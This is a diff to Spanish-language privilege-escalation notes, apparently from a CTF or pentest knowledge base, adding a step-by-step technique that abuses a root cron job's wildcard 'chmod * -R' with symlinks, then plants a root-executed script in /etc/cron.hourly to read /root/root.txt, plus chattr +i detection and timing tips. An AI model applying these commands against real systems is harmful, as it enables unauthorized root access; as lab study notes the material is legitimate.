@@ -2,9 +2,9 @@
 title: Escalación de privilegios (Linux + Windows)
 slug: privilege-escalation
 category: techniques
-updated: 2026-07-26
-summary: "Linux + Windows/AD privesc chains, Node.js inspect, pillaging, real-world gotchas"
-tags: [privesc, linux, windows, sudo, suid, ad, tokens]
+updated: 2026-08-02
+summary: "Linux + Windows/AD privesc chains, wildcard chmod symlink, chattr+i, cron.hourly, Node.js inspect, pillaging"
+tags: [privesc, linux, windows, sudo, suid, ad, tokens, wildcard, cron, symlink, immutable]
 sensitive: false
 ---
 
@@ -52,6 +52,51 @@ netsh wlan show profile name="PROFILE" key=clear
 | Kernel | `uname -a` | DirtyCow, PwnKit, DirtyPipe (5.8–5.16.11) |
 | Auto | — | linpeas.sh / LinEnum.sh (último recurso) |
 
+### Wildcard chmod + symlink privesc (cron script con `chmod * -R`)
+**Condición**: script cron root ejecuta `chmod PERMS * -R` (o similar con wildcard) en un directorio donde el usuario tiene escritura.
+
+**Técnica A — directorio target (acceso de escritura al dir completo):**
+```bash
+# Crear symlink a dir target en el directorio procesado por chmod:
+ln -sf /etc/cron.d /home/user/work/tmp/crondir
+# backup.sh hace: cd /home/user/work/tmp; chmod 777 * -R
+# → chmod(2) sobre /etc/cron.d → directorio target queda 777
+# → (con -R y -H implícito en args de dir) archivos internos también
+```
+
+**Técnica B — archivo target (symlink a fichero dentro de subdir que -R traversa):**
+```bash
+ln -sf /path/to/target.txt /home/user/work/courses/filelink
+# tar archiva el symlink (no su contenido), se extrae a tmp/courses/filelink
+# chmod -R sigue el symlink durante traversal → chmod target.txt
+# BLOQUEADO si target.txt tiene chattr +i (EPERM, no EACCES)
+```
+
+**Detección de chattr +i (immutable):**
+```bash
+lsattr /root/root.txt   # → ----i----------- (i = immutable)
+# Síntoma: echo >> file → "Operation not permitted" (EPERM), no "Permission denied" (EACCES)
+# EPERM = inmutable; EACCES = permisos normales; son errores distintos
+# chmod sobre archivo +i también da EPERM silencioso → parece que no pasó nada
+```
+
+**Escalada vía /etc/cron.hourly/ una vez que queda 777:**
+```bash
+# run-parts SIN --lsbsysinit NO verifica ownership del archivo — solo que sea ejecutable
+# y que NO tenga group-write ni world-write (modo 755 es seguro, 777 es rechazado)
+printf '#!/bin/bash\ncat /root/root.txt > /tmp/flag\nchmod 777 /tmp/flag\n' \
+  > /etc/cron.hourly/getflag
+chmod 755 /etc/cron.hourly/getflag
+# Cron ejecuta run-parts /etc/cron.hourly a las :17 de cada hora → root
+```
+**Gotcha cron.d vs cron.hourly**: `/etc/cron.d/` requiere archivos **root-owned** + sin group/world-write. `/etc/cron.hourly/` no verifica owner — preferir cron.hourly si cron.d está 777 pero solo se puede crear archivos propios.
+
+**Checklist de timing para no quemar el 755:**
+1. Plantar symlink dir en tmp/ → esperar `backup.sh` → dir target 777
+2. Escribir script 755 en dir target
+3. **Borrar el symlink inmediatamente** (si backup.sh vuelve a correr con el symlink presente, pisa el script a 777 y run-parts lo rechaza)
+4. Como fallback: si el script quedó 777, re-chmod a 755 (el dueño puede hacerlo)
+
 ### Node.js --inspect privesc (cuando corre como root)
 ```bash
 # Detectar proceso Node.js con --inspect
@@ -96,6 +141,9 @@ certipy-ad find -u U@DOMAIN -p PASS -dc-ip IP -vulnerable   # AD CS ESC1/ESC8
 ```
 
 ## Gotchas
+- **chattr +i**: `echo >> file` da EPERM ("Operation not permitted"), no EACCES. `chmod` sobre el archivo también falla en silencio. Detectar con `lsattr`. No hay workaround desde user-land sin ser root.
+- **Wildcard chmod + cron.hourly > cron.d**: si solo puedes crear archivos como user (no root), `cron.d` rechaza tus archivos (necesita root-owned); `cron.hourly` ejecuta por run-parts sin check de owner (sin `--lsbsysinit`). Siempre borrar el symlink dir después de que el dir target queda 777, antes del siguiente ciclo de backup.
+- **run-parts 755 vs 777**: archivo 755 en cron.hourly → run-parts lo ejecuta como root. Archivo 777 → rechazado. Re-chmod a 755 si backup.sh lo pisó (eres el dueño → puedes).
 - `sudo -l` con binario raro → GTFOBins ANTES de kernel exploits.
 - SCM mata shells de privesc a los 30s (Error 1053) → lanzar con WMI para sobrevivir.
 - AD: `WriteDacl "sobre CN=Users"` en BloodHound puede ser realmente sobre `DC01$` — confirma el nodo en Node Info.
